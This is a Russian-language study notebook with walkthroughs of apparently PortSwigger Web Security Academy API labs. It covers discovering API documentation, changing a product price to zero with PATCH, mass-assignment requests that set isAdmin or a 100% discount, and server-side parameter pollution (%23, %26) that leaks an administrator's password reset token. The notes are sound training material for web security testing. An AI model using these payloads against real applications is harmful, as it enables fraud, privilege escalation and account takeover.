## Lab: Exploiting an API endpoint using documentation
```
Пытаемся поменять почту и перехватываем это /api/user/wiener

Меняем на 
1. /api/user --> выдает ошибку
2. /api/ --> выдает ошибку
3. /api --> находим документацию и удаляем акк carlos
```
---
Определение поддерживаемых методов HTTP
Метод HTTP определяет действие, которое должно быть выполнено с ресурсом. Например:

    GET - Извлекает данные из ресурса.
    PATCH - Применяет частичные изменения к ресурсу.
    OPTIONS - Извлекает информацию о типах методов запроса, которые могут использоваться для ресурса.

Конечная точка API может поддерживать различные методы HTTP. Поэтому важно протестировать все потенциальные методы при исследовании конечных точек API. Это может позволить вам определить дополнительные функциональные возможности конечной точки, открывая больше возможностей для атаки.

Например, конечная точка /api/задачи могут поддерживать следующие методы:
```
GET /api/tasks - Извлекает список задач.
POST /api/tasks - Создает новую задачу. 
DELETE /api/tasks/1 - Удаляет задачу.
```
---
## Lab: Finding and exploiting an unused API endpoint
```
В браузере Burp зайдите в лабораторию и выберите продукт.

В Proxy > HTTP history обратите внимание на запрос API для продукта. Например, /api/products/3/price.

Щелкните правой кнопкой мыши запрос API и выберите Отправить на Repeater.

На вкладке Repeater измените HTTP-метод для запроса API с GET на OPTIONS, затем отправьте запрос. Обратите внимание, что в ответе указано, что разрешены методы GET и PATCH.

В браузере Burp войдите в приложение, используя учетные данные wiener:peter.
Нажмите на облегченную кожаную куртку "l33t".

В Proxy > История HTTP щелкните правой кнопкой мыши API/products/1/price запрос цены на кожаную куртку и выберите Отправить на Repeater.

На вкладке Повторитель измените метод запроса API с GET на PATCH, затем отправьте запрос. Обратите внимание, что это приводит к ошибке из-за неправильного типа содержимого. В сообщении об ошибке указано, что типом содержимого должно быть application/json.

Добавьте заголовок Content-Type и задайте значение application/json.

Добавьте пустой объект JSON {} в качестве тела запроса, затем отправьте запрос. Обратите внимание, что это приводит к ошибке из-за того, что в теле запроса отсутствует параметр цены.

Добавьте параметр price со значением 0 в объект JSON {"price":0}. Отправьте запрос.

В браузере Burp перезагрузите страницу товара кожаная куртка. Обратите внимание, что цена кожаной куртки теперь составляет $0,00.

Добавьте кожаную куртку в свою корзину.

Перейдите в свою корзину и нажмите Оформить заказ, чтобы решить лабораторную задачу.
```
### Что нужно добавить в запрос:
```
PATCH /api/products/1/price HTTP/2
Content-Type: application/json

{
"price": 0
}

``` 

```
YT: https://www.youtube.com/watch?v=MNUTvKFdzAs
```
---

## Identifying hidden parameters
Поскольку при массовом присвоении параметры создаются из полей объекта, вы часто можете определить эти скрытые параметры, вручную изучив объекты, возвращаемые API.
Например, рассмотрим запрос `PATCH /api/users/,` который позволяет пользователям обновлять свое имя пользователя и электронную почту и содержит следующий JSON:

```
{ 
	"username": "wiener", 
	"email": "wiener@example.com", 
}
```
Одновременный запрос `GET /api/users/123` возвращает следующий JSON:
```
{ 
	"id": 123,
	"name": "John Doe",
	"email": "john@example.com",
	"isAdmin": "false" 
}
```
### Это может указывать на то, что скрытые параметры `id` и `isAdmin` привязаны к внутреннему объекту пользователя, наряду с обновленными параметрами имени пользователя и электронной почты.
---
## Testing mass assignment vulnerabilities
Чтобы проверить, можете ли вы изменить значение перечисляемого параметра `isAdmin`, добавьте его в запрос `PATCH`:
```
{ 
	"username": "wiener",
	"email": "wiener@example.com",
	"isAdmin": false, 
}
```
Кроме того, отправьте запрос `PATCH` с неверным значением параметра `isAdmin`:
```
{ 
	"username": "wiener",
	"email": "wiener@example.com",
	"isAdmin": "foo",
}
```
Если приложение ведет себя по-другому, это может говорить о том, что недопустимое значение влияет на логику запроса, а допустимое - нет. Это может указывать на то, что параметр может быть успешно обновлен пользователем.
Тогда вы можете отправить `PATCH`-запрос со значением параметра `isAdmin`, установленным в `true`, чтобы попытаться использовать уязвимость:
```
{
	"username": "wiener",
	"email": "wiener@example.com",
	"isAdmin": true,
}
```
Если значение `isAdmin` в запросе привязано к объекту user без соответствующей проверки и санации, пользователю `wiener` могут быть неверно предоставлены права администратора. Чтобы определить, так ли это, зайдите в приложение под именем `wiener` и посмотрите, можете ли вы получить доступ к функциям администратора.

---

## Lab: Exploiting a mass assignment vulnerability
1. В браузере Burp войдите в приложение, используя учетные данные `wiener:peter`.
2. Нажмите на товар Легкая кожаная куртка "l33t" и добавьте его в корзину.
3. Перейдите в корзину и нажмите кнопку Оформить заказ. Заметьте, что у вас недостаточно средств для покупки.
4. В разделе Прокси > История HTTP обратите внимание на GET- и POST-запросы API для `/api/checkout`.
5. Обратите внимание, что ответ на `GET`-запрос содержит ту же структуру JSON, что и `POST`-запрос. Обратите внимание, что структура JSON в ответе `GET` включает параметр `selected_discount`, который отсутствует в `POST`-запросе.
6. Щелкните правой кнопкой мыши POST-запрос `/api/checkout` и выберите Send to Repeater.
7. В Repeater добавьте в запрос параметр `chosen_discount`. JSON должен выглядеть следующим образом:
```
{
	"chosen_discount":{ 
		"percentage":0 
	},
	"chosen_products":[
		{
			"product_id":"1",
			 "quantity":1
		} 
	] 
}
```

8. Отправьте запрос. Обратите внимание, что добавление параметра `selected_discount` не приводит к ошибке.
9. Измените значение `selected_discount` на строку `"x"`, затем отправьте запрос. Обратите внимание, что это приводит к сообщению об ошибке, поскольку значение параметра не является числом. Это может указывать на то, что пользовательский ввод обрабатывается.
10. Измените значение параметра `selected_discount` на `100`, затем отправьте запрос, чтобы решить лабораторную работу.
---

## Testing for server-side parameter pollution in the query string
Чтобы проверить загрязнение параметров на стороне сервера в строке запроса, поместите во входные данные такие символы синтаксиса запроса, как `#`, `&` и `=`, и понаблюдайте за реакцией приложения.

Рассмотрим уязвимое приложение, позволяющее искать других пользователей по их имени пользователя. Когда вы ищете пользователя, ваш браузер выполняет следующий запрос:
```
GET /userSearch?name=peter&back=/home
```
Чтобы получить информацию о пользователе, сервер обращается к внутреннему API со следующим запросом:
```
GET /users/search?name=peter&publicProfile=true
```
---

## Truncating query strings
Вы можете использовать закодированный в URL символ `#`, чтобы попытаться усечь запрос на стороне сервера. Чтобы помочь вам интерпретировать ответ, вы также можете добавить строку после символа `#`.

Например, можно изменить строку запроса следующим образом:
```
GET /userSearch?name=peter%23foo&back=/home
```
Фронт-энд попытается получить доступ к следующему URL:
```
GET /users/search?name=peter#foo&publicProfile=true
```
Примечание:
```
Обязательно кодируйте символ # в URL. В противном случае внешнее приложение будет интерпретировать его как идентификатор фрагмента, и он не будет передан внутреннему API.
```
Просмотрите ответ, чтобы узнать, был ли запрос усечен. Например, если в ответ возвращается пользователь peter, запрос на стороне сервера мог быть усечен. Если возвращается сообщение об ошибке Invalid name, приложение, возможно, рассматривает foo как часть имени пользователя. Это говорит о том, что запрос на стороне сервера, возможно, не был усечен.

Если вам удалось усечь запрос на стороне сервера, это устраняет требование, чтобы поле publicProfile было установлено в true. Вы можете использовать это для возврата непубличных профилей пользователей.

---

## Injecting invalid parameters
Вы можете использовать символ `&`, закодированный в URL, чтобы попытаться добавить второй параметр в запрос на стороне сервера.

Например, вы можете изменить строку запроса следующим образом:
`GET /userSearch?name=peter%26foo=xyz&back=/home`
Это приводит к следующему серверному запросу к внутреннему API:
`GET /users/search?name=peter&foo=xyz&publicProfile=true`

Просмотрите ответ, чтобы найти подсказки о том, как был разобран дополнительный параметр. Например, если ответ не изменился, это может указывать на то, что параметр был успешно внедрен, но проигнорирован приложением.
Чтобы составить более полную картину, необходимо провести дополнительные тесты.

---

## Overriding existing parameters
Чтобы проверить, уязвимо ли приложение к загрязнению параметров на стороне сервера, можно попробовать переопределить исходный параметр. Для этого введите второй параметр с тем же именем.

Например, можно изменить строку запроса следующим образом:
`GET /userSearch?name=peter%26name=carlos&back=/home`
Это приводит к следующему серверному запросу к внутреннему API:
`GET /users/search?name=peter&name=carlos&publicProfile=true`

Внутренний API интерпретирует два параметра имени. Влияние этого зависит от того, как приложение обрабатывает второй параметр. В разных веб-технологиях это происходит по-разному. Например:
``
```
    PHP анализирует только последний параметр. Это приведет к тому, что пользователь будет искать Карлоса.
    ASP.NET объединяет оба параметра. В результате пользователь будет искать peter,carlos, что может привести к сообщению об ошибке Invalid username.
    Node.js / express анализирует только первый параметр. В результате пользователь будет искать peter, что даст неизменный результат.
```
Если вам удастся переопределить исходный параметр, вы сможете провести эксплойт. Например, можно добавить в запрос name=administrator. Это позволит вам войти в систему под именем администратора.

---

## Lab: Exploiting server-side parameter pollution in a query string
и тут как-то много писать и мне лень....
1. Заходим и пытаемся сбросить пароль для `administrator`
2. ищем это:
![[Pasted image 20240116214206.png]]
3. кидаем в Repeater и меняем параметр 

csrf=тут_крякозябра_от_сервера_она_разная&username=administrator%26field=reset_token

4. забирайте это:
```
{
	"result":"то_что_тут",
	"type":"reset_token"
}
```
5. И делаем запрос в url в браузере:
```
https://лаба.web-security-academy.net/forgot-password?reset_token=то_что_забрали выше
```
6. делаем новый пароль и заходим, и выполняем лабу до конца!
7. конец

---

## Отлично! Вы завершили тестирование API.
